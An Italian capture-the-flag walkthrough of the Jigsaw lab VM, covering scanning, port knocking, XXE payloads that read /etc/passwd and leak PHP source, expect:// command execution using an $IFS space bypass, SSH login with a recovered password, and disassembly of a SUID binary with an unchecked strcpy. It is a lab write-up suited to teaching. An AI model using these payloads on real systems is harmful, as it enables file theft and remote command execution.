# Jigsaw CTF
# Soluzione Walkthrough


VM : Jigsaw









Iniziamo con la scansione della rete, nel nostro caso 192.168.1.140/24 e con l'identificazione del nostro target :

```
root@kali:~# nmap -sn 192.168.1.0/24

Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-23 18:46 EDT
Nmap scan report for 192.168.1.1
Host is up (0.0084s latency).
MAC Address: 18:0F:76:98:55:8C (Unknown)
Nmap scan report for DESKTOP-7C0JALA (192.168.1.140)
Host is up (0.0061s latency).
MAC Address: 08:00:27:88:7A:84 (Oracle VirtualBox virtual NIC)
Nmap scan report for DESKTOP-7C0JALA (192.168.1.232)
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 15.34 seconds
```

Verifichiamo l'ip locale :

```
root@kali:~# ip addr sh

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:1b:2d:b5 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.232/24 brd 192.168.1.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe1b:2db5/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
root@kali:~# ping 192.168.1.140
PING 192.168.1.140 (192.168.1.140) 56(84) bytes of data.
64 bytes from 192.168.1.140: icmp_seq=1 ttl=64 time=8.49 ms
64 bytes from 192.168.1.140: icmp_seq=2 ttl=64 time=5.12 ms
^C
--- 192.168.1.140 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 5.121/6.805/8.490/1.686 ms
```

Il nostro target risulta avere l'indirizzo 192.168.1.140.


Da una prima analisi sul target,sembrerebbe non aver servizi esposti all'esterno :

```
nmap -vvv -sS -p 1-65535 -sV -O 192.168.1.140
``` 
 Tutto filtrato.

Proviamo a verificare le porte udp.procediamo con una scansione in questa modalita' :

```
nmap -vvv -sU -p 1-65535 192.168.1.140
```


Durante la scansione udp, analizzando il traffico dati passante con wireshark, osserviamo che la macchina target spedisce dei pacchetti in broadcast con il seguente contenuto :


Sempre la stessa lunghezza
Sempre la porta 666 di destinazione 
E all'interno del campo dati troviamo il testo sotto :



![Schermata da 2019-08-24 07-44-12](https://user-images.githubusercontent.com/54471416/63640722-db0a4c00-c671-11e9-842b-fe98a5a1f505.png)



Proviamo dunque a connetterci in modalita' udp con la porta 666 e a inserire la password suggerita sopra :

```
root@kali:~# nc -u 192.168.1.140 666

j19s4w
ZmxhZzF7MzAzNGNjMjkyN2I1OWUwYjIwNjk2MjQxZjE0ZDU3M2V9CllvdSBjb21wbGV0ZWQgeW91ciBmaXJzdCB0ZXN0LiBOb3cga25vY2sgdGhlc2UgbnVtYmVycyB0byBmaW5kIHdoYXQgeW91IHNlZWsuIDU1MDAgNjYwMCA3NzAw
```

Qualcosa e' successo!
Ci e' stata fornita una stringa in risposta.

Provando a decodificare con formato base64 la stringa trovata, otteniamo un primo risultato :

```
root@kali:~/Jigsaw# echo ZmxhZzF7MzAzNGNjMjkyN2I1OWUwYjIwNjk2MjQxZjE0ZDU3M2V9CllvdSBjb21wbGV0ZWQgeW91ciBmaXJzdCB0ZXN0LiBOb3cga25vY2sgdGhlc2UgbnVtYmVycyB0byBmaW5kIHdoYXQgeW91IHNlZWsuIDU1MDAgNjYwMCA3NzAw | base64 -d

flag1{3034cc2927b59e0b20696241f14d573e}
You completed your first test. Now knock these numbers to find what you seek. 5500 6600 7700
```


La prima flag.
Procediamo con il port knocking sulle porte 5500 6600 7700.
Utilizziamo per lo scopo il seguente script che cicla sulle porte fornite in input.


```
root@kali:~# cat Jigsaw/portknock.sh

#!/bin/bash
HOST=$1
shift
for ARG in "$@"
do
	nmap -Pn --host-timeout 1 --max-retries 0 -p $ARG $HOST
done

```

Proviamo a eseguire lo script :

```
root@kali:~# /root/Jigsaw/portknock.sh 192.168.1.140 5500 6600 7700

Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-24 18:59 EDT
Warning: 192.168.1.140 giving up on port because retransmission cap hit (0).
-Nmap scan report for jigsaw (192.168.1.140)
Host is up (0.0032s latency).

PORT     STATE    SERVICE
5500/tcp filtered hotline
MAC Address: 08:00:27:88:7A:84 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-24 18:59 EDT
Warning: 192.168.1.140 giving up on port because retransmission cap hit (0).
Nmap scan report for jigsaw (192.168.1.140)
Host is up (0.0028s latency).

PORT     STATE    SERVICE
6600/tcp filtered mshvlm
MAC Address: 08:00:27:88:7A:84 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-24 18:59 EDT
Warning: 192.168.1.140 giving up on port because retransmission cap hit (0).
Nmap scan report for jigsaw (192.168.1.140)
Host is up (0.0041s latency).

PORT     STATE    SERVICE
7700/tcp filtered em7-secom
MAC Address: 08:00:27:88:7A:84 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```


Vediamo se troviamo qualche cosa di nuovo :

```
root@kali:~# nmap 192.168.1.140

Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-24 19:00 EDT
Nmap scan report for DESKTOP-7C0JALA (192.168.1.140)
Host is up (0.0023s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:88:7A:84 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.23 seconds
```

Il target sembra avere esposto un webserver.
Dall'estratto di una scansione piu' approfondita verifichiamo anche la versione del servizio attivo :

```
nmap -vvv -sS -p 1-65535 -sV -O 192.168.1.140

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 08:00:27:88:7A:84 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 ```

Adesso diamo un'occhiata con il browser.
Troviamo una pagina web con una gif che cicla continuamente, come mostrato sotto :


![Schermata da 2019-08-24 07-22-16](https://user-images.githubusercontent.com/54471416/63640705-823ab380-c671-11e9-9674-7777a2f7840d.png)


Da un'analisi all'interno del sorgente della pagina web radice troviamo il seguente commento :

```
<!--
 When you are in hell, only your mind can help you out. 
 Test #2 will soon arrive. 
-->

```

Un passaggio di directory force con Dirbuster non ha prodotto risultati.

Dopo qualche test, penso di scaricare la gif della pagina e di esaminarla con hexdump e strings.
Noto che, alla fine della gif, sembrerebbe essere incollata una stringa che potrebbe essere una url :

```
root@kali:~# hexdump -C Jigsaw/jigsaw.gif | tail
0001b250  bc 65 4c 6a a9 cb 87 e4  b2 97 8e e4 25 30 19 22  |.eLj........%0."|
0001b260  00 61 0e 53 21 c5 3c a6  44 92 a9 4c 88 30 b3 99  |.a.S!.<.D..L.0..|
0001b270  0e 79 26 34 89 69 cc 69  66 a9 9a d6 fc 25 1f 0b  |.y&4.i.if....%..|
0001b280  90 82 1a 74 cd 9a 0b 89  c0 06 de 07 4e 85 80 a0  |...t........N...|
0001b290  9c 0b 11 c0 01 48 42 47  74 22 a4 9d ee 34 08 3c  |.....HBGt"...4.<|
0001b2a0  e3 99 25 7a ae 11 9b d3  d4 66 33 f5 a9 13 4c 7e  |..%z.....f3...L~|
0001b2b0  1e d3 9f c3 04 28 30 05  da 4b 82 ea d2 a0 e5 09  |.....(0..K......|
0001b2c0  08 00 3b 2f 77 34 6e 37  37 30 70 31 34 79 34 39  |..;/w4n770p14y49|
0001b2d0  34 6d 33 0a                                       |4m3.|
0001b2d4
```

/w4n770p14y494m3


Proviamola sul target e voila'!
http://192.168.1.140/w4n770p14y494m3/

Un portale di login!



![Schermata da 2019-08-24 15-00-35](https://user-images.githubusercontent.com/54471416/63647532-92de3e80-c6f0-11e9-8161-006e4ea2a3a6.png)



Da uno sguardo agli header http troviamo queste utili informazioni :


Apache/2.4.7 (Ubuntu)
PHP/5.5.9-1ubuntu4.29


Notiamo oltretutto che il corpo della post inviata al server contiene un testo di tipo xml contenente i campi email e password che troviamo nella form della pagina di login.
Potremmo a questo punto verificare se la pagina in questione e' vulnerabile a un attacco di tipo XXE.
Da Burp Suite, modifichiamo il corpo del pacchetto http in formato xml, in qualche cosa del genere :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT email ANY >
<!ELEMENT password ANY >
<!ENTITY xxe SYSTEM "/etc/passwd">
]>

<root>
   <email>&xxe;</email>
   <password>aaa</password>
</root>
```

et voila!
Otteniamo questa risposta :

```
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
libuuid:x:100:101::/var/lib/libuuid: 
syslog:x:101:104::/home/syslog:/bin/false 
messagebus:x:102:106::/var/run/dbus:/bin/false 
landscape:x:103:109::/var/lib/landscape:/bin/false 
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
jigsaw:x:1000:1000:,,,:/home/jigsaw:/bin/bash
```

A questo punto cerchiamo altre informazioni utili sul sistema.
Per rendere piu' agevole i test e poterne salvare con semplicita' i risultati utilizziamo la shell come sotto :

Creiamo un file cookies.txt e editiamo con il corpo xml sopra e poi eseguiamo la richiesta http in questo modo :

```
curl -d @cookies.txt -X POST http://192.168.1.140/w4n770p14y494m3/game2.php | grep -v " does not exist"
```


A questo punto proviamo a eseguire un leak del sorgente per vedere cosa fa.
Come sotto :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT email ANY >
<!ELEMENT password ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=game2.php">
]>

<root>
	<email>&xxe;</email>
   <password>aaa</password>
</root>
```


Otteniamo un risultato che ci fa capire che il login e' solo fittizio, non e' presente ne un reale processo di autenticazione ne alcun database di backend.
Sotto il codice sorgente della pagina game2.php :



```
<?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$info = simplexml_import_dom($dom);
$email = $info->email;
$password = $info->password;
echo "$email does not exist";
?>
```


Testate le possibili alternative con file .dtd remoto di appoggio, ma da una analisi delle tempistiche di risposta possiamo dedurre che le connessioni verso l'esterno sono bloccate e che la risposta dello script php ritorna quando si esaurisce il tempo di timeout della connessione.
Dopo aver dato un'occhiata a qualche file interessante all'interno del filesystem, notiamo che possiamo solo leggere file specifici di cui conosciamo a priori il percorso, ma non possiamo fare altro, come enumerare servizi, directory, creare file ecc...
Per cercare di aggirare l'ostacolo, proviamo a verificare se e' possibile ottenere anche un rce sfruttando il modulo expect di php, che se installato permette di eseguire comandi di sistema con i permessi del servizio web.
Modifichiamo il file di richiesta cookies.txt come sotto :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT email ANY >
<!ELEMENT password ANY >
<!ENTITY xxe SYSTEM "expect://id;ls$IFS-l;pwd">
]>

<root>
	<email>&xxe;</email>
   <password>xxee</password>
</root>
```


Nota : Troviamo delle limitazioni nell'esecuzione di comandi date dallo schema xml e dall'expect stesso.  
Se si introduce all'interno della stringa di expect uno dei caratteri >,| o lo spazio (ma anche qualche altro), questo crea problemi nel passaggio di parametri ai comandi.
Essendo eseguito in ambiente bash, per il carattere spazio possiamo per esempio sfruttare una variabile builtin con un trick simile a questo ($IFS) per bypassare questa restrizione.
e lanciamo il test :

```
root@kali:~/Jigsaw# curl -q -d @cookies.txt -X POST http://192.168.1.140/w4n770p14y494m3/game2.php 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
total 116
-rw-r--r-- 1 www-data www-data    292 May 10 03:47 game2.php
-rw-r--r-- 1 www-data www-data 106488 Aug 31  2017 image.jpg
-rw-r--r-- 1 www-data www-data   2110 May 10 03:46 index.html
drwxr-xr-x 2 www-data www-data   4096 May  9 08:38 js
/var/www/html/w4n770p14y494m3
```

Bingo!In questo caso il modulo expect risulta installato.
Possiamo quindi effettuare una analisi piu' approfondita sul target.
Dato che pensiamo che ci possa essere attivo il firewall che blocca, prendiamo qualche altra informazione, iniettando qualcosa come sotto :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT email ANY >
<!ELEMENT password ANY >
<!ENTITY xxe SYSTEM "expect://id;ls$IFS-l;pwd;netstat$IFS-na;lsof;ss;ls$IFS-l$IFS/home/*;ls$IFS-l$IFS/etc/apache2/*;ls$IFS-l$IFS/etc/*">
]>

<root>
	<email>&xxe;</email>
   <password>aaa</password>
</root>
```

E leggiamo qualche file interessante per i nostri scopi , anche se non abbiamo accesso a tutti :


/etc/apache2/sites-available/000-default.conf
/etc/iptables/rules.v4
/etc/iptables/rules.v6
/etc/ufw/ufw.conf

In cookies.txt :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT email ANY >
<!ELEMENT password ANY >
<!ENTITY file1 SYSTEM "php://filter/resource=/etc/apache2/sites-available/000-default.conf">
<!ENTITY file2 SYSTEM "php://filter/resource=/etc/iptables/rules.v4">
<!ENTITY file3 SYSTEM "php://filter/resource=/etc/iptables/rules.v6">
<!ENTITY file4 SYSTEM "php://filter/resource=/etc/ufw/ufw.conf">
<!ENTITY file5 SYSTEM "php://filter/resource=/etc/passwd">
]>

<root>
	<email>&file2; &file3; &file4; &file5;</email>
   <password>aaa</password>
</root>
```

E lanciamo :

```
root@kali:~/Jigsaw# curl -q -d @cookies.txt -X POST http://192.168.1.140/w4n770p14y494m3/game2.php
# Generated by iptables-save v1.4.21 on Fri May 10 04:58:03 2019
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [134:27320]
-A INPUT -p tcp -j DROP
COMMIT
# Completed on Fri May 10 04:58:03 2019
 # Generated by ip6tables-save v1.4.21 on Fri May 10 04:58:03 2019
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
COMMIT
# Completed on Fri May 10 04:58:03 2019
 # /etc/ufw/ufw.conf
#

...
```

Proviamo a creare un file passando a expect "touch$IFS'test.php';ls$IFS-l" e troviamo il nuovo file.
Adesso proviamo a scriverci dentro.
Da test effettuati risulta che non possiamo utilizzare i caratteri di redirect ne il pipe, inoltre utilizzando $IFS se dopo si trovano dei caratteri alfanumerici per funzionare dobbiamo racchiuderli tra 2 '.

Guardiamo ancora tra le configurazioni del server.
Notiamo che iptables di default non sembra bloccare nulla, ma verifichiamo che e' installato ufw.
Anche se non possiamo accedere in lettura alle regole saved di ufw, notiamo che possiamo comunque accedervi tramite cache.



/var/lib/ucf/cache/:etc:ufw:before.rules
/var/lib/ucf/cache/:etc:ufw:after.rules


cookies.txt

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ELEMENT email ANY >
  <!ELEMENT password ANY >
  <!ENTITY xxe SYSTEM "expect://env;tail$IFS-n$IFS'15'$IFS/var/lib/ucf/cache/:etc:ufw:after.rules;tail$IFS-n$IFS'15'$IFS/var/lib/ucf/cache/:etc:ufw:before.rules;ls$IFS-lhR$IFS'/var/lib/ucf/cache/'">
]>

<root>
	<email>&xxe; </email>
   <password>aaa</password>
</root>
```
Lanciamo la richiesta :

```
root@kali:~/Jigsaw# curl -q -d @cookies.txt -X POST http://192.168.1.140/w4n770p14y494m3/game2.php 
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html/w4n770p14y494m3
# End required lines

# don't log noisy services by default
-A ufw-after-input -p udp --dport 137 -j ufw-skip-to-policy-input
-A ufw-after-input -p udp --dport 138 -j ufw-skip-to-policy-input
-A ufw-after-input -p tcp --dport 139 -j ufw-skip-to-policy-input
-A ufw-after-input -p tcp --dport 445 -j ufw-skip-to-policy-input
-A ufw-after-input -p udp --dport 67 -j ufw-skip-to-policy-input
-A ufw-after-input -p udp --dport 68 -j ufw-skip-to-policy-input

# don't log noisy broadcast
-A ufw-after-input -m addrtype --dst-type BROADCAST -j ufw-skip-to-policy-input

# don't delete the 'COMMIT' line or these rules won't be processed
COMMIT

# all other non-local packets are dropped
-A ufw-not-local -m limit --limit 3/min --limit-burst 10 -j ufw-logging-deny
-A ufw-not-local -j DROP

# allow MULTICAST mDNS for service discovery (be sure the MULTICAST line above
# is uncommented)
-A ufw-before-input -p udp -d 224.0.0.251 --dport 5353 -j ACCEPT

# allow MULTICAST UPnP for service discovery (be sure the MULTICAST line above
# is uncommented)
-A ufw-before-input -p udp -d 239.255.255.250 --dport 1900 -j ACCEPT

# don't delete the 'COMMIT' line or these rules won't be processed
COMMIT
/var/lib/ucf/cache/:
total 52K
-rw-r--r-- 1 root root 1.3K May 10 02:25 :etc:default:grub
-rw-r--r-- 1 root root   68 Apr 22 13:43 :etc:php5:mods-available:curl.ini
-rw-r--r-- 1 root root   64 Apr 22 13:43 :etc:php5:mods-available:gd.ini
-rw-r--r-- 1 root root   83 Apr 22 13:43 :etc:php5:mods-available:opcache.ini
-rw-r--r-- 1 root root   66 Apr 22 13:43 :etc:php5:mods-available:pdo.ini
-rw-r--r-- 1 root root   76 Apr 22 13:43 :etc:php5:mods-available:pdo_sqlite.ini
-rw-r--r-- 1 root root   76 Apr 22 13:43 :etc:php5:mods-available:readline.ini
-rw-r--r-- 1 root root   73 Apr 22 13:43 :etc:php5:mods-available:sqlite3.ini
-rw-r--r-- 1 root root 1.7K Apr 18  2013 :etc:rsyslog.d:50-default.conf
-rw-r--r-- 1 root root 1004 Feb 28  2014 :etc:ufw:after.rules
-rw-r--r-- 1 root root  915 Feb 28  2014 :etc:ufw:after6.rules
-rw-r--r-- 1 root root 2.7K Feb 28  2014 :etc:ufw:before.rules
-rw-r--r-- 1 root root 3.2K Feb 28  2014 :etc:ufw:before6.rules
```


Tra le altre cose notiamo che e' attivo il servizio ssh : 


![Schermata da 2019-08-25 07-12-23](https://user-images.githubusercontent.com/54471416/63649133-cd9fa100-c707-11e9-9eb9-0db1308276a1.png)


questo pero' non e' raggiungibile dall'esterno, quindi si potrebbe pensare che come il servizio http, sshd sia dietro un controllo di port knocking.
Cerchiamo  delle informazioni a riguardo, ricordando che abbiamo notato la presenza del servizio knockd.
Troviamo il file /etc/knockd.conf che oltre a sembrare leggibile potrebbe dare degli spunti interessanti per i nostri scopi.

Procediamo :

cookies.txt

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT email ANY >
<!ELEMENT password ANY >
<!ENTITY xxe SYSTEM "expect://cat$IFS'/etc/knockd.conf'">
]>

<root>
   <email>&xxe;</email>
   <password>aaa</password>
</root>
  
```

Mandiamo in esecuzione :


```
root@kali:~/Jigsaw# curl -d @cookies.txt -X POST http://192.168.1.140/w4n770p14y494m3/game2.php
[options]
	UseSyslog


[openHTTP]
        sequence    = 5500,6600,7700
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT 1 -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[closeHTTP]
        sequence    = 7700,6600,5500
        seq_timeout = 100
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[openSSH]
        sequence    = 7011,8011,9011
        seq_timeout = 5
        command     = /sbin/iptables -I INPUT 1 -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9011,8011,7011
        seq_timeout = 5
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
```


Perfetto!
Abbiamo trovato i trigger per il port knocking anche per il servizio sshd!
Verifichiamo adesso lo sbloccco.


```
/root/Jigsaw/portknock.sh 192.168.1.140 7011 8011 9011

root@kali:~/Jigsaw# /root/Jigsaw/portknock.sh 192.168.1.140 7011 8011 9011
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-11 15:47 EDT
Warning: 192.168.1.140 giving up on port because retransmission cap hit (0).
Nmap scan report for jigsaw (192.168.1.140)
Host is up (0.0038s latency).

PORT     STATE    SERVICE
7011/tcp filtered talon-disc
MAC Address: 08:00:27:88:7A:84 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-11 15:47 EDT
Warning: 192.168.1.140 giving up on port because retransmission cap hit (0).
Nmap scan report for jigsaw (192.168.1.140)
Host is up (0.0027s latency).

PORT     STATE    SERVICE
8011/tcp filtered unknown
MAC Address: 08:00:27:88:7A:84 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-11 15:47 EDT
Warning: 192.168.1.140 giving up on port because retransmission cap hit (0).
Nmap scan report for jigsaw (192.168.1.140)
Host is up (0.0033s latency).

PORT     STATE    SERVICE
9011/tcp filtered unknown
MAC Address: 08:00:27:88:7A:84 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```


Non dimentichiamoci che conosciamo l'esistenza dell'utente jigsaw e una possibile password trovata nel messaggio iniziale.j19s4w.


```
root@kali:~/Jigsaw# ssh jigsaw@192.168.1.140
The authenticity of host '192.168.1.140 (192.168.1.140)' can't be established.
ECDSA key fingerprint is SHA256:oXn/1IjNjNv4INght0MV2FrWXVvTB4QNM9Bx1aRRLos.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.140' (ECDSA) to the list of known hosts.
jigsaw@192.168.1.140's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 4.4.0-146-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sat Aug 10 10:20:23 CDT 2019


jigsaw@jigsaw:~$ 

jigsaw@jigsaw:~$ id
uid=1000(jigsaw) gid=1000(jigsaw) groups=1000(jigsaw)
jigsaw@jigsaw:~$ ls
y0ud1dw3118u7175n070v32.txt
jigsaw@jigsaw:~$ cat y0ud1dw3118u7175n070v32.txt 

flag2{a69ef5c0fa50b933f05a5878a9cbbb54}
Hack or fail. Make your choice... Now comes your final test.
```


Abbiamo raggiunto la seconda flag.
Adesso abbiamo una shell interattiva e possiamo attivamente cercare informazioni sui servizi e il sistema running.

```
jigsaw@jigsaw:~$ uname -a
Linux jigsaw 4.4.0-146-generic #172~14.04.1-Ubuntu SMP Fri Apr 5 16:52:29 UTC 2019 i686 i686 i686 GNU/Linux

jigsaw@jigsaw:~$ cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
```


Notiamo che fino ad ora i nomi dei files delle flag hanno questo formato "gameN"
Facciamo una ricerca nel filesystem in questo senso :

```
jigsaw@jigsaw:~$ find / -name game*
/usr/include/linux/gameport.h
/usr/games
/usr/src/linux-headers-3.13.0-32/include/uapi/linux/gameport.h
/usr/src/linux-headers-3.13.0-32/include/linux/gameport.h
/usr/src/linux-headers-3.13.0-32/drivers/input/gameport
/usr/src/linux-headers-4.4.0-146/include/uapi/linux/gameport.h
/usr/src/linux-headers-4.4.0-146/include/linux/gameport.h
/usr/src/linux-headers-4.4.0-146/drivers/input/gameport
/usr/src/linux-headers-3.13.0-32-generic/include/linux/gameport.h
/usr/src/linux-headers-3.13.0-32-generic/include/config/gameport.h
/usr/src/linux-headers-3.13.0-32-generic/include/config/gameport
/usr/src/linux-headers-3.13.0-32-generic/include/config/joystick/gamecon.h
/usr/src/linux-headers-3.13.0-169-generic/include/linux/gameport.h
/usr/src/linux-headers-3.13.0-169-generic/include/config/gameport.h
/usr/src/linux-headers-3.13.0-169-generic/include/config/gameport
/usr/src/linux-headers-3.13.0-169-generic/include/config/joystick/gamecon.h
/usr/src/linux-headers-4.4.0-146-generic/include/config/gameport.h
/usr/src/linux-headers-4.4.0-146-generic/include/config/gameport
/usr/src/linux-headers-4.4.0-146-generic/include/config/joystick/gamecon.h
/usr/src/linux-headers-3.13.0-169/include/uapi/linux/gameport.h
/usr/src/linux-headers-3.13.0-169/include/linux/gameport.h
/usr/src/linux-headers-3.13.0-169/drivers/input/gameport
/usr/local/games
/bin/game3
find: `/root': Permission denied

...

jigsaw@jigsaw:~$ ls -lh /bin/game3 
-rwsr-xr-x 1 root root 7.2K May 10 04:23 /bin/game3
```


Troviamo qualche cosa di interessante.Un game3 con flag suid.
Sara' il nostro prossimo obbiettivo.

```
jigsaw@jigsaw:~$ file /bin/game3 
/bin/game3: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=affd50502e973bd3d6d0637028395d87ba695ab9, not stripped
```

Verifichiamo che si tratta di un eseguibile, linkato dinamicamente.
Proviamo dunque ad eseguirlo senza alcun parametro e con un parametro.


```
jigsaw@jigsaw:~$ /bin/game3 
game3: Most people are so ungrateful to be a hacker, but not you, not any more...

jigsaw@jigsaw:~$ /bin/game3 aaa
jigsaw@jigsaw:~$
```


Scarichiamo l'eseguibile in locale , sulla macchina attaccante.

```
scp jigsaw@192.168.1.140:/bin/game3 ./game3
jigsaw@192.168.1.140's password: 
game3								100% 7338   857.4KB/s   00:00    
root@kali:~/Jigsaw#
```




adesso, disassembliamo l'eseguibile.


```
root@kali:~/Jigsaw# objdump -d game3

...

Disassemblamento della sezione .plt:

08048300 <.plt>:
 8048300:       ff 35 04 a0 04 08       pushl  0x804a004
 8048306:       ff 25 08 a0 04 08       jmp    *0x804a008
 804830c:       00 00                   add    %al,(%eax)
        ...

08048310 <strcpy@plt>:
 8048310:       ff 25 0c a0 04 08       jmp    *0x804a00c
 8048316:       68 00 00 00 00          push   $0x0
 804831b:       e9 e0 ff ff ff          jmp    8048300 <.plt>

08048320 <__gmon_start__@plt>:
 8048320:       ff 25 10 a0 04 08       jmp    *0x804a010
 8048326:       68 08 00 00 00          push   $0x8
 804832b:       e9 d0 ff ff ff          jmp    8048300 <.plt>

08048330 <__libc_start_main@plt>:
 8048330:       ff 25 14 a0 04 08       jmp    *0x804a014
 8048336:       68 10 00 00 00          push   $0x10
 804833b:       e9 c0 ff ff ff          jmp    8048300 <.plt>

08048340 <errx@plt>:
 8048340:       ff 25 18 a0 04 08       jmp    *0x804a018
 8048346:       68 18 00 00 00          push   $0x18
 804834b:       e9 b0 ff ff ff          jmp    8048300 <.plt>

Disassemblamento della sezione .text:

...

0804844d <main>:
 804844d:       55                      push   %ebp
 804844e:       89 e5                   mov    %esp,%ebp
 8048450:       83 e4 f0                and    $0xfffffff0,%esp
 8048453:       83 ec 50                sub    $0x50,%esp
 8048456:       83 7d 08 01             cmpl   $0x1,0x8(%ebp)
 804845a:       75 14                   jne    8048470 <main+0x23>
 804845c:       c7 44 24 04 20 85 04    movl   $0x8048520,0x4(%esp)
 8048463:       08 
 8048464:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 804846b:       e8 d0 fe ff ff          call   8048340 <errx@plt>
 8048470:       8b 45 0c                mov    0xc(%ebp),%eax
 8048473:       83 c0 04                add    $0x4,%eax
 8048476:       8b 00                   mov    (%eax),%eax
 8048478:       89 44 24 04             mov    %eax,0x4(%esp)
 804847c:       8d 44 24 10             lea    0x10(%esp),%eax
 8048480:       89 04 24                mov    %eax,(%esp)
 8048483:       e8 88 fe ff ff          call   8048310 <strcpy@plt>
 8048488:       c9                      leave  
 8048489:       c3                      ret    
 804848a:       66 90                   xchg   %ax,%ax
 804848c:       66 90                   xchg   %ax,%ax
 804848e:       66 90                   xchg   %ax,%ax
```




Riscontriamo velocemente che le funzioni utilizzate sono errx e strcpy e le rispettive chiamate alla plt table.
